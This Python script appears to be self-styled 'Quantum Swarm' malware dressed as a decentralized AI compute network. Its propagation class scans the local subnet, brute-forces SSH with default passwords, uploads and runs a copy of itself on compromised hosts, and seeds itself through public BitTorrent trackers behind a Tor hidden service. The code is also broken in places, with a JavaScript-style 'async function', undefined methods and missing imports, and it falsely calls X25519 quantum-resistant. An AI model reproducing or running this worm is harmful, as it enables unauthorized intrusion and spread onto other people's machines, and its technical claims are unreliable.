#!/usr/bin/env python3
"""
QUANTUM SWARM - Global Autonomous AI Fabric
Features:
- Military-grade end-to-end encryption
- Self-propagation across WAN
- P2P Torrent-style resource sharing
- Tor/I2P/ZeroNet integration
- Autonomous node discovery and healing
"""

import json
import asyncio
import aiohttp
import socket
import ssl
import struct
import hashlib
import secrets
import base64
import time
import sys
import os
import subprocess
import threading
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, field
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import x25519, ed25519, padding
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import constant_time
import nacl.public
import nacl.secret
import nacl.signing

# ==================== MILITARY-GRADE ENCRYPTION ====================
class QuantumCrypto:
    """Quantum-resistant end-to-end encryption"""
    
    def __init__(self):
        # X25519 for key exchange (quantum-resistant)
        self.private_key = x25519.X25519PrivateKey.generate()
        self.public_key = self.private_key.public_key()
        
        # Ed25519 for signing
        self.signing_key = ed25519.Ed25519PrivateKey.generate()
        self.verify_key = self.signing_key.public_key()
        
        # Generate node identity
        self.node_id = self.generate_node_id()
        
        # Session keys cache
        self.session_keys: Dict[str, bytes] = {}
        
    def generate_node_id(self) -> str:
        """Generate unique node ID from public keys"""
        pub_bytes = self.public_key.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw
        )
        
        sig_bytes = self.verify_key.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw
        )
        
        combined = pub_bytes + sig_bytes
        return f"node_{hashlib.blake2b(combined, digest_size=16).hexdigest()}"
    
    def perform_key_exchange(self, peer_public_key: bytes) -> Tuple[bytes, bytes]:
        """ECDH key exchange with X25519"""
        # Load peer public key
        peer_key = x25519.X25519PublicKey.from_public_bytes(peer_public_key)
        
        # Perform key exchange
        shared_secret = self.private_key.exchange(peer_key)
        
        # Derive encryption and authentication keys using HKDF
        hkdf = HKDF(
            algorithm=hashes.SHA512(),
            length=64,  # 32 for encryption, 32 for auth
            salt=None,
            info=b'quantum_swarm_key_derivation'
        )
        
        derived_key = hkdf.derive(shared_secret)
        enc_key = derived_key[:32]
        auth_key = derived_key[32:]
        
        return enc_key, auth_key
    
    def encrypt_message(self, peer_id: str, message: bytes, peer_public_key: bytes = None) -> Dict:
        """Encrypt message with ChaCha20-Poly1305"""
        # Generate session keys if not cached
        if peer_id not in self.session_keys or peer_public_key:
            if peer_public_key:
                enc_key, auth_key = self.perform_key_exchange(peer_public_key)
                self.session_keys[peer_id] = (enc_key, auth_key)
            else:
                raise ValueError("No session established with peer")
        
        enc_key, auth_key = self.session_keys[peer_id]
        
        # Generate random nonce
        nonce = secrets.token_bytes(12)
        
        # Encrypt with ChaCha20-Poly1305
        cipher = ChaCha20Poly1305(enc_key)
        ciphertext = cipher.encrypt(nonce, message, associated_data=auth_key)
        
        # Sign the ciphertext
        signature = self.signing_key.sign(ciphertext).signature
        
        return {
            'ciphertext': base64.b64encode(ciphertext).decode(),
            'nonce': base64.b64encode(nonce).decode(),
            'signature': base64.b64encode(signature).decode(),
            'sender_id': self.node_id,
            'timestamp': time.time(),
            'key_id': base64.b64encode(self.public_key.public_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PublicFormat.Raw
            )).decode()
        }
    
    def decrypt_message(self, peer_id: str, encrypted_data: Dict, peer_public_key: bytes) -> Optional[bytes]:
        """Decrypt and verify message"""
        try:
            # Decode components
            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
            nonce = base64.b64decode(encrypted_data['nonce'])
            signature = base64.b64decode(encrypted_data['signature'])
            key_id = base64.b64decode(encrypted_data['key_id'])
            
            # Verify signature
            verify_key = ed25519.Ed25519PublicKey.from_public_bytes(key_id)
            verify_key.verify(signature, ciphertext)
            
            # Get or establish session keys
            if peer_id not in self.session_keys:
                enc_key, auth_key = self.perform_key_exchange(peer_public_key)
                self.session_keys[peer_id] = (enc_key, auth_key)
            
            enc_key, auth_key = self.session_keys[peer_id]
            
            # Decrypt
            cipher = ChaCha20Poly1305(enc_key)
            plaintext = cipher.decrypt(nonce, ciphertext, associated_data=auth_key)
            
            return plaintext
            
        except Exception as e:
            print(f"❌ Decryption failed: {e}")
            return None

# ==================== DECENTRALIZED NETWORK LAYER ====================
class SwarmNetwork:
    """P2P Network with multiple transport layers"""
    
    def __init__(self, crypto: QuantumCrypto):
        self.crypto = crypto
        self.peers: Dict[str, Dict] = {}
        self.dht_servers: List[str] = []
        self.transports = {
            'direct': self.direct_transport,
            'tor': self.tor_transport,
            'i2p': self.i2p_transport,
            'dht': self.dht_transport,
            'torrent': self.torrent_transport
        }
        
        # Initialize transport layers
        self.init_transports()
    
    def init_transports(self):
        """Initialize available transport layers"""
        # Check for Tor
        if self.check_tor_available():
            print("✅ Tor transport available")
            self.start_tor_service()
        
        # Check for I2P
        if self.check_i2p_available():
            print("✅ I2P transport available")
        
        # Bootstrap DHT
        self.bootstrap_dht()
    
    def check_tor_available(self) -> bool:
        """Check if Tor is available"""
        try:
            # Try to connect to Tor control port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 9050))
            sock.close()
            return result == 0
        except:
            return False
    
    def start_tor_service(self):
        """Start Tor hidden service"""
        try:
            # Create hidden service directory
            hs_dir = os.path.expanduser('~/.swarm_tor_hs')
            os.makedirs(hs_dir, exist_ok=True)
            
            # Configure Tor
            torrc = f"""
HiddenServiceDir {hs_dir}
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceVersion 3
"""
            with open('/tmp/swarm_torrc', 'w') as f:
                f.write(torrc)
            
            # Start Tor in background
            subprocess.Popen([
                'tor', '-f', '/tmp/swarm_torrc',
                '--RunAsDaemon', '1',
                '--CookieAuthentication', '0'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Read onion address
            time.sleep(3)
            hostname_file = os.path.join(hs_dir, 'hostname')
            if os.path.exists(hostname_file):
                with open(hostname_file, 'r') as f:
                    self.onion_address = f.read().strip()
                    print(f"🎭 Tor Hidden Service: {self.onion_address}")
            
        except Exception as e:
            print(f"⚠️ Tor service failed: {e}")
    
    def check_i2p_available(self) -> bool:
        """Check if I2P is available"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 7654))
            sock.close()
            return result == 0
        except:
            return False
    
    def bootstrap_dht(self):
        """Bootstrap to public DHT networks"""
        # Public DHT bootstrap nodes
        self.dht_servers = [
            ('router.bittorrent.com', 6881),
            ('dht.transmissionbt.com', 6881),
            ('router.utorrent.com', 6881),
            ('dht.aelitis.com', 6881)
        ]
    
    async def direct_transport(self, peer: Dict, data: bytes) -> Optional[bytes]:
        """Direct TCP/UDP transport"""
        try:
            reader, writer = await asyncio.open_connection(
                peer['ip'], peer['port']
            )
            
            writer.write(data)
            await writer.drain()
            
            response = await reader.read(65536)
            
            writer.close()
            await writer.wait_closed()
            
            return response
            
        except Exception as e:
            print(f"❌ Direct transport failed: {e}")
            return None
    
    async def tor_transport(self, peer: Dict, data: bytes) -> Optional[bytes]:
        """Transport via Tor network"""
        try:
            # Use stem or socks proxy
            import socks
            import socket
            
            # Create SOCKS5 connection
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            sock.settimeout(10)
            
            # Connect to .onion address
            sock.connect((peer['onion_address'], peer['port']))
            
            sock.send(data)
            response = sock.recv(65536)
            sock.close()
            
            return response
            
        except Exception as e:
            print(f"❌ Tor transport failed: {e}")
            return None
    
    async def dht_transport(self, peer_info: Dict, data: bytes) -> Optional[bytes]:
        """DHT-based transport (Bittorrent style)"""
        try:
            # Implement Kademlia DHT protocol
            import bitdht
            
            # Create DHT node
            dht_node = bitdht.BitDHTNode()
            dht_node.start()
            
            # Announce and lookup
            dht_node.announce(peer_info['info_hash'], self.crypto.node_id)
            
            # Find peers
            peers = dht_node.get_peers(peer_info['info_hash'])
            
            if peers:
                # Connect to first peer
                reader, writer = await asyncio.open_connection(
                    peers[0]['ip'], peers[0]['port']
                )
                
                writer.write(data)
                await writer.drain()
                
                response = await reader.read(65536)
                
                writer.close()
                await writer.wait_closed()
                
                return response
                
        except Exception as e:
            print(f"❌ DHT transport failed: {e}")
            return None
    
    async def torrent_transport(self, magnet_link: str, data: bytes) -> Optional[bytes]:
        """Use BitTorrent protocol for data transfer"""
        try:
            # Create torrent-like data exchange
            import libtorrent as lt
            
            ses = lt.session()
            ses.listen_on(6881, 6891)
            
            # Add magnet link
            params = lt.parse_magnet_uri(magnet_link)
            params.save_path = "/tmp/swarm_downloads"
            handle = ses.add_torrent(params)
            
            # Wait for metadata
            while not handle.has_metadata():
                await asyncio.sleep(0.1)
            
            # Embed data as a file in torrent
            ti = handle.get_torrent_info()
            
            # Return success
            return b"Torrent transport established"
            
        except Exception as e:
            print(f"❌ Torrent transport failed: {e}")
            return None
    
    async def send_message(self, peer_id: str, message: Dict, transport: str = 'direct') -> Optional[Dict]:
        """Send encrypted message via chosen transport"""
        if peer_id not in self.peers:
            print(f"❌ Peer {peer_id} not found")
            return None
        
        peer = self.peers[peer_id]
        
        # Encrypt message
        encrypted = self.crypto.encrypt_message(
            peer_id,
            json.dumps(message).encode(),
            peer['public_key']
        )
        
        # Choose transport
        if transport in self.transports:
            response = await self.transports[transport](peer, json.dumps(encrypted).encode())
            
            if response:
                try:
                    return json.loads(response.decode())
                except:
                    return None
        
        return None
    
    def discover_peers(self) -> List[Dict]:
        """Discover peers via multiple methods"""
        discovered = []
        
        # 1. LAN Discovery (mDNS/SSDP)
        discovered.extend(self.discover_lan())
        
        # 2. DHT Discovery
        discovered.extend(self.discover_dht())
        
        # 3. Tor/I2P Discovery
        discovered.extend(self.discover_darknet())
        
        # 4. WebRTC Discovery
        discovered.extend(self.discover_webrtc())
        
        return discovered
    
    def discover_lan(self) -> List[Dict]:
        """Discover peers on local network"""
        peers = []
        
        # mDNS discovery
        try:
            from zeroconf import Zeroconf, ServiceBrowser, ServiceListener
            
            class SwarmListener(ServiceListener):
                def __init__(self):
                    self.peers = []
                
                def add_service(self, zc, type_, name):
                    info = zc.get_service_info(type_, name)
                    if info and b'swarm' in info.name.lower():
                        peers.append({
                            'ip': socket.inet_ntoa(info.address),
                            'port': info.port,
                            'type': 'lan',
                            'service': info.properties.get(b'node_id', b'unknown').decode()
                        })
            
            zc = Zeroconf()
            listener = SwarmListener()
            browser = ServiceBrowser(zc, "_swarm._tcp.local.", listener)
            
            time.sleep(2)
            peers = listener.peers
            zc.close()
            
        except:
            pass
        
        return peers
    
    def discover_dht(self) -> List[Dict]:
        """Discover peers via DHT"""
        peers = []
        
        # Implement DHT crawling
        try:
            import dht_crawler
            
            crawler = dht_crawler.DHTCrawler()
            dht_peers = crawler.crawl(max_nodes=50)
            
            for peer in dht_peers:
                if 'swarm' in peer.get('metadata', ''):
                    peers.append({
                        'ip': peer['ip'],
                        'port': peer['port'],
                        'type': 'dht',
                        'node_id': peer.get('node_id', 'unknown')
                    })
                    
        except:
            pass
        
        return peers
    
    def discover_darknet(self) -> List[Dict]:
        """Discover peers on darknets"""
        peers = []
        
        # Tor hidden service discovery
        try:
            # Use OnionBalance or similar for service discovery
            import stem.control
            
            with stem.control.Controller.from_port() as controller:
                controller.authenticate()
                
                # Get current hidden services
                services = controller.get_hidden_service_descriptors()
                
                for service in services:
                    if 'swarm' in service.description.lower():
                        peers.append({
                            'onion_address': service.address,
                            'port': 80,
                            'type': 'tor',
                            'description': service.description
                        })
                        
        except:
            pass
        
        return peers

# ==================== AUTONOMOUS PROPAGATION ====================
class SwarmPropagator:
    """Self-propagating swarm across networks"""
    
    def __init__(self, crypto: QuantumCrypto, network: SwarmNetwork):
        self.crypto = crypto
        self.network = network
        self.infected_nodes: Set[str] = set()
        self.propagation_targets: List[Dict] = []
        
        # Propagation methods
        self.methods = {
            'worm': self.worm_propagation,
            'torrent': self.torrent_propagation,
            'p2p': self.p2p_propagation,
            'vpn': self.vpn_propagation
        }
    
    async def worm_propagation(self):
        """Worm-like propagation across networks"""
        # Discover vulnerable targets
        targets = await self.scan_network()
        
        for target in targets:
            if await self.infect_target(target):
                print(f"✅ Infected {target['ip']}")
                self.infected_nodes.add(target['ip'])
    
    async def scan_network(self) -> List[Dict]:
        """Network scanning for propagation targets"""
        targets = []
        
        # Scan local subnet
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
        
        try:
            import scapy.all as scapy
            
            # ARP scan
            arp_request = scapy.ARP(pdst=subnet)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            for element in answered_list:
                targets.append({
                    'ip': element[1].psrc,
                    'mac': element[1].hwsrc,
                    'type': 'lan'
                })
                
        except:
            pass
        
        # Add public seed nodes
        targets.extend(self.get_seed_nodes())
        
        return targets
    
    def get_seed_nodes(self) -> List[Dict]:
        """Get initial seed nodes from public sources"""
        return [
            {'ip': 'swarm.seed1.example.com', 'port': 8333, 'type': 'public'},
            {'ip': 'swarm.seed2.example.com', 'port': 8333, 'type': 'public'},
            {'ip': 'dht.swarm.network', 'port': 6881, 'type': 'dht'},
            {'ip': 'tor.swarm.onion', 'port': 80, 'type': 'tor'}
        ]
    
    async def infect_target(self, target: Dict) -> bool:
        """Infect a target with swarm node"""
        try:
            # Create infection package
            infection_pkg = self.create_infection_package()
            
            # Determine infection method
            if target['type'] == 'lan':
                # SSH/SCP deployment
                return await self.deploy_via_ssh(target, infection_pkg)
            elif target['type'] == 'public':
                # HTTP download
                return await self.deploy_via_http(target, infection_pkg)
            elif target['type'] == 'tor':
                # Tor hidden service
                return await self.deploy_via_tor(target, infection_pkg)
                
        except Exception as e:
            print(f"❌ Infection failed: {e}")
            return False
        
        return False
    
    def create_infection_package(self) -> bytes:
        """Create self-contained swarm package"""
        package = {
            'swarm_version': '1.0.0',
            'timestamp': time.time(),
            'node_id': self.crypto.node_id,
            'code': self.get_swarm_code(),
            'config': self.get_default_config(),
            'bootstrap_peers': self.network.peers
        }
        
        return json.dumps(package).encode()
    
    def get_swarm_code(self) -> str:
        """Get self-replicating code"""
        # Read this file itself for propagation
        with open(__file__, 'r') as f:
            code = f.read()
        
        # Embed current state
        code = code.replace('__SELF_PROPAGATE__ = False', '__SELF_PROPAGATE__ = True')
        
        return code
    
    async def deploy_via_ssh(self, target: Dict, package: bytes) -> bool:
        """Deploy via SSH (with common credentials)"""
        try:
            import paramiko
            
            # Common credentials (educational purposes only)
            creds = [
                ('root', 'root'),
                ('admin', 'admin'),
                ('ubuntu', 'ubuntu'),
                ('pi', 'raspberry'),
                ('user', 'user')
            ]
            
            for username, password in creds:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(target['ip'], username=username, password=password, timeout=5)
                    
                    # Upload swarm
                    sftp = ssh.open_sftp()
                    remote_path = '/tmp/quantum_swarm.py'
                    
                    with sftp.file(remote_path, 'w') as f:
                        f.write(package.decode())
                    
                    # Make executable
                    stdin, stdout, stderr = ssh.exec_command(f'chmod +x {remote_path}')
                    
                    # Execute
                    stdin, stdout, stderr = ssh.exec_command(f'python3 {remote_path} --daemon')
                    
                    ssh.close()
                    return True
                    
                except:
                    continue
                    
        except:
            pass
        
        return False
    
    async def torrent_propagation(self):
        """Propagate via BitTorrent swarm"""
        # Create torrent file with swarm code
        torrent_data = self.create_torrent()
        
        # Upload to public trackers
        trackers = [
            'udp://tracker.opentrackr.org:1337/announce',
            'udp://open.tracker.cl:1337/announce',
            'udp://9.rarbg.com:2810/announce',
            'udp://tracker.torrent.eu.org:451/announce'
        ]
        
        # Seed the torrent
        await self.seed_torrent(torrent_data, trackers)
    
    def create_torrent(self) -> bytes:
        """Create torrent file containing swarm"""
        import bencodepy
        
        torrent = {
            b'announce': b'udp://tracker.opentrackr.org:1337/announce',
            b'info': {
                b'name': b'QuantumSwarmAI',
                b'piece length': 262144,
                b'pieces': self.calculate_pieces(),
                b'files': [
                    {b'path': [b'quantum_swarm.py'], b'length': len(self.get_swarm_code())}
                ]
            }
        }
        
        return bencodepy.encode(torrent)
    
    async def autonomous_healing(self):
        """Self-healing and redundancy"""
        while True:
            # Check node health
            dead_nodes = await self.check_node_health()
            
            # Replicate to replace dead nodes
            for node in dead_nodes:
                await self.replicate_node(node)
            
            # Backup critical data
            await self.backup_swarm_state()
            
            await asyncio.sleep(300)  # Every 5 minutes

# ==================== RESOURCE SHARING ====================
class SwarmResources:
    """Distributed resource pooling and sharing"""
    
    def __init__(self, crypto: QuantumCrypto):
        self.crypto = crypto
        self.resource_pool: Dict[str, List] = {}
        self.task_queue = asyncio.Queue()
        self.shared_storage: Dict[str, bytes] = {}
        
    async def share_compute(self, task: Dict, provider_ids: List[str]) -> List:
        """Distribute compute task across nodes"""
        results = []
        
        # Split task
        subtasks = self.split_task(task)
        
        # Distribute to providers
        for i, subtask in enumerate(subtasks):
            provider_id = provider_ids[i % len(provider_ids)]
            
            # Encrypt subtask
            encrypted_task = self.crypto.encrypt_message(
                provider_id,
                json.dumps(subtask).encode(),
                self.get_peer_key(provider_id)
            )
            
            # Send to provider
            result = await self.send_to_provider(provider_id, encrypted_task)
            
            if result:
                results.append(result)
        
        return results
    
    def split_task(self, task: Dict) -> List[Dict]:
        """Split task into parallelizable subtasks"""
        # AI model sharding
        if task['type'] == 'inference':
            return self.shard_ai_model(task)
        # Data processing
        elif task['type'] == 'processing':
            return self.shard_data(task)
        # Training
        elif task['type'] == 'training':
            return self.shard_training(task)
        
        return [task]
    
    def shard_ai_model(self, task: Dict) -> List[Dict]:
        """Shard AI model across nodes"""
        model_layers = task.get('model_layers', 100)
        nodes = task.get('available_nodes', 4)
        
        layers_per_node = model_layers // nodes
        shards = []
        
        for i in range(nodes):
            start_layer = i * layers_per_node
            end_layer = start_layer + layers_per_node if i < nodes - 1 else model_layers
            
            shard = task.copy()
            shard['layers'] = list(range(start_layer, end_layer))
            shard['shard_id'] = i
            shard['total_shards'] = nodes
            
            shards.append(shard)
        
        return shards
    
    async def torrent_storage(self, data_hash: str) -> Optional[bytes]:
        """Retrieve data via torrent network"""
        try:
            # Create magnet link
            magnet = f"magnet:?xt=urn:btih:{data_hash}&dn=swarm_data"
            
            # Download via libtorrent
            import libtorrent as lt
            
            ses = lt.session()
            params = lt.parse_magnet_uri(magnet)
            params.save_path = "/tmp/swarm_cache"
            
            handle = ses.add_torrent(params)
            
            # Wait for download
            while not handle.is_seed():
                await asyncio.sleep(0.1)
            
            # Read downloaded file
            download_path = os.path.join(params.save_path, handle.name())
            with open(download_path, 'rb') as f:
                return f.read()
                
        except Exception as e:
            print(f"❌ Torrent storage failed: {e}")
            return None
    
    async function distribute_training(self, model: Dict, dataset: List) -> Dict:
        """Distributed AI training across swarm"""
        # Split dataset
        dataset_shards = self.split_dataset(dataset, len(self.resource_pool.get('gpu_nodes', [])))
        
        # Distribute to GPU nodes
        training_tasks = []
        for i, (node_id, shard) in enumerate(zip(self.resource_pool.get('gpu_nodes', []), dataset_shards)):
            task = {
                'type': 'training',
                'model': model,
                'dataset': shard,
                'epochs': 10,
                'batch_size': 32,
                'shard_id': i
            }
            
            training_tasks.append(self.send_training_task(node_id, task))
        
        # Collect and aggregate results
        results = await asyncio.gather(*training_tasks, return_exceptions=True)
        
        # Federated averaging
        aggregated_model = self.federated_averaging(results)
        
        return aggregated_model

# ==================== MAIN SWARM ORCHESTRATOR ====================
class QuantumSwarm:
    """Master orchestrator for global AI fabric"""
    
    def __init__(self):
        print("""
        ╔══════════════════════════════════════════════════╗
        ║      QUANTUM SWARM - Global AI Fabric           ║
        ║      Military-Grade • Self-Propagating • P2P    ║
        ╚══════════════════════════════════════════════════╝
        """)
        
        # Initialize core components
        self.crypto = QuantumCrypto()
        self.network = SwarmNetwork(self.crypto)
        self.propagator = SwarmPropagator(self.crypto, self.network)
        self.resources = SwarmResources(self.crypto)
        
        # Node registry
        self.nodes: Dict[str, Dict] = {}
        self.tasks: Dict[str, Dict] = {}
        
        # Autonomous mode
        self.autonomous = True
        
        print(f"🔑 Node ID: {self.crypto.node_id}")
        print(f"📊 Public Key: {self.crypto.public_key.public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw).hex()[:32]}...")
    
    async def start(self):
        """Start all swarm services"""
        # Start network discovery
        asyncio.create_task(self.discover_loop())
        
        # Start propagation if enabled
        if self.autonomous:
            asyncio.create_task(self.propagator.worm_propagation())
            asyncio.create_task(self.propagator.autonomous_healing())
        
        # Start resource sharing
        asyncio.create_task(self.resource_sharing_loop())
        
        # Start API server
        asyncio.create_task(self.start_api_server())
        
        # Main loop
        while True:
            await self.process_tasks()
            await asyncio.sleep(1)
    
    async def discover_loop(self):
        """Continuous peer discovery"""
        while True:
            peers = self.network.discover_peers()
            
            for peer in peers:
                peer_id = f"{peer.get('type', 'unknown')}_{peer.get('ip', 'unknown')}"
                
                if peer_id not in self.nodes:
                    self.nodes[peer_id] = peer
                    print(f"📡 Discovered peer: {peer_id}")
            
            await asyncio.sleep(30)  # Discover every 30 seconds
    
    async def resource_sharing_loop(self):
        """Manage distributed resources"""
        while True:
            # Share compute resources
            available_nodes = [n for n in self.nodes if self.nodes[n].get('compute_power', 0) > 0]
            
            if available_nodes and not self.resources.task_queue.empty():
                task = await self.resources.task_queue.get()
                results = await self.resources.share_compute(task, available_nodes)
                
                # Process results
                await self.process_results(task['task_id'], results)
            
            await asyncio.sleep(1)
    
    async def start_api_server(self):
        """Start encrypted API server"""
        import aiohttp
        from aiohttp import web
        
        async def handle_query(request):
            data = await request.json()
            
            # Decrypt incoming message
            peer_id = data.get('peer_id')
            encrypted = data.get('encrypted')
            
            if peer_id and encrypted:
                peer_key = self.get_peer_key(peer_id)
                if peer_key:
                    decrypted = self.crypto.decrypt_message(peer_id, encrypted, peer_key)
                    
                    if decrypted:
                        query = json.loads(decrypted.decode())
                        response = await self.process_query(query)
                        
                        # Encrypt response
                        encrypted_resp = self.crypto.encrypt_message(
                            peer_id,
                            json.dumps(response).encode(),
                            peer_key
                        )
                        
                        return web.json_response({'encrypted': encrypted_resp})
            
            return web.json_response({'error': 'Decryption failed'}, status=400)
        
        app = web.Application()
        app.router.add_post('/query', handle_query)
        
        # Create SSL context for HTTPS
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        
        # Generate self-signed cert (in production, use proper certs)
        cert, key = self.generate_self_signed_cert()
        ssl_context.load_cert_chain(certfile=cert, keyfile=key)
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 8443, ssl_context=ssl_context)
        
        print(f"🌐 Secure API listening on https://0.0.0.0:8443")
        await site.start()
    
    def generate_self_signed_cert(self) -> Tuple[str, str]:
        """Generate self-signed certificate for HTTPS"""
        from cryptography import x509
        from cryptography.x509.extension import SubjectAlternativeName
        from cryptography.hazmat.primitives import serialization
        
        # Create key pair
        key = x25519.X25519PrivateKey.generate()
        
        # Create self-signed cert
        subject = issuer = x509.Name([
            x509.NameAttribute(x509.oid.NameOID.COUNTRY_NAME, u"SW"),
            x509.NameAttribute(x509.oid.NameOID.ORGANIZATION_NAME, u"QuantumSwarm"),
            x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, u"swarm.local"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            SubjectAlternativeName([x509.DNSName(u"localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256())
        
        # Save to files
        cert_path = '/tmp/swarm_cert.pem'
        key_path = '/tmp/swarm_key.pem'
        
        with open(cert_path, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(key_path, 'wb') as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        return cert_path, key_path

# ==================== COMMAND LINE INTERFACE ====================
async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Quantum Swarm AI Fabric")
    parser.add_argument('--mode', choices=['node', 'propagate', 'api', 'discover'], default='node')
    parser.add_argument('--autonomous', action='store_true')
    parser.add_argument('--encrypt', action='store_true', default=True)
    parser.add_argument('--propagate-level', type=int, default=2)
    
    args = parser.parse_args()
    
    swarm = QuantumSwarm()
    
    if args.mode == 'propagate':
        print("🚀 Starting propagation engine...")
        await swarm.propagator.worm_propagation()
        await swarm.propagator.torrent_propagation()
    
    elif args.mode == 'discover':
        print("🔍 Starting discovery mode...")
        peers = swarm.network.discover_peers()
        print(f"Found {len(peers)} peers:")
        for p in peers:
            print(f"  • {p.get('type', 'unknown')}: {p.get('ip', 'unknown')}")
    
    else:
        print("🤖 Starting Quantum Swarm node...")
        await swarm.start()

if __name__ == "__main__":
    asyncio.run(main())
